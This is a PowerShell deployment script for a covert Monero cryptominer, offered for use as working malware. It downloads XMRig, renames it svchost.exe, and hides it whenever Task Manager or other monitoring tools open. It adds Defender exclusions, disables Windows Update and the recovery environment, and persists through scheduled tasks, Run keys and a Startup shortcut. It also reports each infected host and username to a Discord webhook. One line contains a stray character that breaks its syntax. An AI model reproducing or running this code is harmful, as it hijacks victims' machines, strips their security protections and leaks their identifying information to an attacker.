# ============================================================
#  XMR Standalone Pro Deployer v3.2 (HARDENED)
#  - Base: Proven v3.1 Code
#  - Added: Insta-Kill Taskmgr (3s Resolution)
#  - Added: Windows Update & Reset Lockdown
#  - Fixed: Precision Path Detection (System-Safe)
# ============================================================

# ==================== CONFIG ====================
$wallet = "473TeE9SqJGd59Y7gzTjgmT4VNo1KK3y2QzZppdGSGQbbwCDpTrRYUMhRNoXattjfQPwpjzi92zB2NrDiHgm9kuF7Wp63tF"
$pool = "pool.hashvault.pro:443"
$poolBak = "pool.supportxmr.com:443"
$idleCpu = 100
$activeCpu = 30
$idleThreshold = 120

$installDir = "$env:APPDATA\WindowsServices"
$xmrigExe = "$installDir\svchost.exe"
$configFile = "$installDir\config.json"
$watchdogPs1 = "$installDir\watchdog.ps1"
$watchdogVbs = "$installDir\monitor.vbs"
$xmrigUrl = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip"
$zipFile = "$env:TEMP\winsvc.zip"
$extractDir = "$env:TEMP\winsvc_extract"
$xmrigApiPort = 45580
$rigId = "$env:COMPUTERNAME"
$worker = "$env:COMPUTERNAME"

# ==================== FUNCTIONS ====================

function Install-Miner {
    try {
        # [PRECISION] Kill only YOUR processes - never system svchost
        Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object { 
            ($_.ExecutablePath -eq $xmrigExe) -or 
            ($_.CommandLine -like "*$watchdogVbs*") -or 
            ($_.CommandLine -like "*$watchdogPs1*")
        } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
    }
    catch {}
    
    Start-Sleep -Seconds 2
    New-Item -ItemType Directory -Path $installDir -Force | Out-Null
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls

    $downloaded = $false
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
        $wc.DownloadFile($xmrigUrl, $zipFile); $downloaded = $true
    }
    catch {
        try { Invoke-WebRequest -Uri $xmrigUrl -OutFile $zipFile -UseBasicParsing -ErrorAction Stop; $downloaded = $true } catch {}
    }

    if (-not $downloaded) { throw "Download failed" }
    if (Test-Path $extractDir) { Remove-Item $extractDir -Recurse -Force -ErrorAction SilentlyContinue }
    Expand-Archive -Path $zipFile -DestinationPath $extractDir -Force
    $srcExe = Get-ChildItem -Path $extractDir -Filter "xmrig.exe" -Recurse | Select-Object -First 1
    if ($srcExe) { Copy-Item -Path $srcExe.FullName -Destination $xmrigExe -Force }
    Remove-Item $zipFile, $extractDir -Recurse -Force -ErrorAction SilentlyContinue
}

function Write-MinerConfig {
    param([int]$CpuPercent = $idleCpu)
    $cfg = @{
        autosave = $false; opencl = $false; "donate-level" = 0; background = $true;
        cpu = @{ "max-threads-hint" = $CpuPercent; priority = 2; "huge-pages" = $true; "huge-pages-jit" = $true; asm = $true; "memory-pool" = $true };
        pools = @(
            @{ url = "stratum+ssl://${pool}"; user = $wallet; pass = $worker; "rig-id" = $rigId; keepalive = $true; tls = $true },
            @{ url = "stratum+ssl://${poolBak}"; user = $wallet; pass = $worker; "rig-id" = $rigId; keepalive = $true; tls = $true }
        );
        http = @{ enabled = $true; host = "127.0.0.1"; port = $xmrigApiPort; restricted = $false };
        randomx = @{ "1gb-pages" = $true; wrmsr = $true; "numa" = $true; mode = "auto"; "cache_qos" = $true }
    } | ConvertTo-Json -Depth 5
    Set-Content -Path $configFile -Value $cfg -Force
}

function Write-Watchdog {
    $code = @"
Add-Type @'
using System;
using System.Runtime.InteropServices;
public struct LASTINPUTINFO { public uint cbSize; public uint dwTime; }
public class IdleDetect {
    [DllImport("user32.dll")]
    public static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
    public static uint GetIdleSeconds() {
        LASTINPUTINFO lii = new LASTINPUTINFO();
        lii.cbSize = (uint)Marshal.SizeOf(typeof(LASTINPUTINFO));
        if (!GetLastInputInfo(ref lii)) return 0;
        return ((uint)Environment.TickCount - lii.dwTime) / 1000;
    }
}
'@

`$xmrigExe       = "$xmrigExe"
`$configFile     = "$configFile"
`$xmrigApiPort   = $xmrigApiPort
`$idleCpu        = $idleCpu
`$activeCpu      = $activeCpu
`$idleThreshold  = $idleThreshold
`$lastState      = ""

function Set-XmrigCpu {
    param([int]`$Percent)
    try {
        `$body = @{ "cpu" = @{ "max-threads-hint" = `$Percent } } | ConvertTo-Json -Depth 3
        Invoke-RestMethod -Uri "http://127.0.0.1:`${xmrigApiPort}/2/config" -Method PUT -Body `$body -ContentType "application/json" -ErrorAction Stop | Out-Null
    } catch {}
}

function Ensure-MinerState {
    param([bool]`$shouldRun)
    `$proc = Get-Process -Name "svchost" -ErrorAction SilentlyContinue | Where-Object { `$_.Path -eq `$xmrigExe }
    if (`$shouldRun -and -not `$proc) {
        Start-Process `$xmrigExe -ArgumentList "--config=`"`$configFile`"" -WindowStyle Hidden -ErrorAction SilentlyContinue
    } elseif (-not `$shouldRun -and `$proc) {
        `$proc | Stop-Process -Force -ErrorAction SilentlyContinue
    }
}

while (`$true) {
    try {
        # --- INSTA-KILL TASKMGR (3s Resolution) ---
        `$monitored = Get-Process -Name "Taskmgr", "ProcessHacker", "PerfMon", "ResourceMonitor" -ErrorAction SilentlyContinue
        if (`$monitored) {
            Ensure-MinerState -shouldRun `$false
            `$lastState = "monitored"
        } else {
            `$idleSecs = [IdleDetect]::GetIdleSeconds()
            `$isIdle = `$idleSecs -ge `$idleThreshold
            `$targetCpu = if (`$isIdle) { `$idleCpu } else { `$activeCpu }
            `$state = if (`$isIdle) { "idle" } else { "active" }
            if (`$state -ne `$lastState) {
                Ensure-MinerState -shouldRun `$true
                Start-Sleep -Seconds 1
                Set-XmrigCpu -Percent `$targetCpu; `$lastState = `$state
            }
            Ensure-MinerState -shouldRun `$true
        }
    } catch {}
    Start-Sleep -Seconds 3
}
"@
    Set-Content -Path $watchdogPs1 -Value $code -Force
}

function Write-VbsLauncher {
    Set-Content -Path $watchdogVbs -Value "Set objShell = CreateObject(`"WScript.Shell`")`nobjShell.Run `"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"`"$watchdogPs1`"`"`, 0, False" -Force
}

function Set-Persistence {
    # Lock down Windows Reset
    try { & reagentc.exe /disable 2>$null } catch {}

    $taskName = "WindowsServiceUpdate"; $wdTask = "WindowsServiceMonitor"
    try {
        $a1 = New-ScheduledTaskAction -Execute $xmrigExe -Argument "--config=`"$configFile`""
        $a2 = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$watchdogVbs`""
        $trig = New-ScheduledTaskTrigger -AtLogon
        Register-ScheduledTask -TaskName $taskName -Action $a1 -Trigger $trig -RunLevel Highest -Force | Out-Null
        Register-ScheduledTask -TaskName $wdTask -Action $a2 -Trigger $trig -RunLevel Highest -Force | Out-Null
    }
    catch {}

    $reg = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    Set-ItemProperty $reg "WindowsServiceUpdate" "`"$xmrigExe`" --config=`"$configFile`"" -Force
    Set-ItemProperty $reg "WindowsServiceMonitor" "wscript.exe `"$watchdogVbs`"" -Force

    $start = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")
    try {
        $ws = New-Object -ComObject WScript.Shell
        $sc = $ws.CreateShortcut("$start\ServiceMonitor.lnk")
        $sc.TargetPath = "wscript.exe"; $sc.Arguments = "`"$watchdogVbs`心; $sc.WindowStyle = 7; $sc.Save()
    }
    catch {}
}

function Lockdown-System {
    # Disable Windows Updates
    try {
        $svcs = "wuauserv", "bits", "dosvc"
        foreach ($s in $svcs) {
            Set-Service -Name $s -StartupType Disabled -ErrorAction SilentlyContinue
            Stop-Service -Name $s -Force -ErrorAction SilentlyContinue
        }
    }
    catch {}
}

function Enable-HugePages {
    try {
        $tmpCfg = "$env:TEMP\secpol.cfg"; $tmpDb = "$env:TEMP\secpol.sdb"
        secedit /export /cfg $tmpCfg /quiet 2>$null
        $sid = (New-Object System.Security.Principal.NTAccount($env:USERNAME)).Translate([System.Security.Principal.SecurityIdentifier]).Value
        $content = Get-Content $tmpCfg -Raw
        if ($content -match 'SeLockMemoryPrivilege\s*=\s*(.*)') {
            if ($Matches[1] -notlike "*$sid*") { $content = $content -replace "(SeLockMemoryPrivilege\s*=\s*)(.*)", "`$1`$2,*$sid" }
        }
        else { $content = $content -replace "(\[Privilege Rights\])", "`$1`r`nSeLockMemoryPrivilege = *$sid" }
        Set-Content $tmpCfg $content -Force
        secedit /configure /db $tmpDb /cfg $tmpCfg /quiet 2>$null
        Remove-Item $tmpCfg, $tmpDb -Force -ErrorAction SilentlyContinue
    }
    catch {}
}

function Disable-Sleep {
    try {
        powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c 2>$null
        powercfg /change standby-timeout-ac 0; powercfg /change standby-timeout-dc 0
        powercfg /change hibernate-timeout-ac 0; powercfg /change hibernate-timeout-dc 0; powercfg /hibernate off 2>$null
    }
    catch {}
}

function Send-DiscordWebhook {
    $webhookUrl = "https://discord.com/api/webhooks/1506387263402278992/f3X-mX_mjq74YCqpZYNB2WH4hEg6NZj8LY6lPstCCtz31kJwthqkxXF580E187PnZI2a"
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        # Use simple escaping to avoid JSON breakage
        $h = $env:COMPUTERNAME -replace '[^\x20-\x7E]', '' -replace '"', '\"'
        $u = $env:USERNAME -replace '[^\x20-\x7E]', '' -replace '"', '\"'
        $t = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
        
        $json = '{"username":"itzcurled-miner","embeds":[{"title":"Miner Active! ⚡","color":3447003,"fields":[{"name":"Host","value":"' + $h + '","inline":true},{"name":"User","value":"' + $u + '","inline":true}],"timestamp":"' + $t + '"}]}'
        
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Content-Type", "application/json")
        $wc.UploadData($webhookUrl, "POST", [System.Text.Encoding]::UTF8.GetBytes($json)) | Out-Null
    }
    catch {}
}

# ==================== MAIN ====================
try {
    # CLEAN SWEEP (Exact Path Only)
    try {
        Get-ScheduledTask -TaskName "WindowsService*" -ErrorAction SilentlyContinue | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
        Get-Process -Name "svchost" -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq $xmrigExe } | Stop-Process -Force -ErrorAction SilentlyContinue
    }
    catch {}

    try { Add-MpPreference -ExclusionPath $installDir, "$env:TEMP" -ErrorAction SilentlyContinue } catch {}
    Lockdown-System
    Disable-Sleep; Enable-HugePages
    Install-Miner; Write-MinerConfig; Write-Watchdog; Write-VbsLauncher; Set-Persistence
    Start-Process $xmrigExe -ArgumentList "--config=`"$configFile`"" -WindowStyle Hidden
    Start-Sleep -Seconds 4
    Start-Process "wscript.exe" -ArgumentList "`"$watchdogVbs`"" -WindowStyle Hidden
    Send-DiscordWebhook
    Write-Host "[+] Pro Deploy Success."
}
catch { Write-Host "[-] Error: $_" }
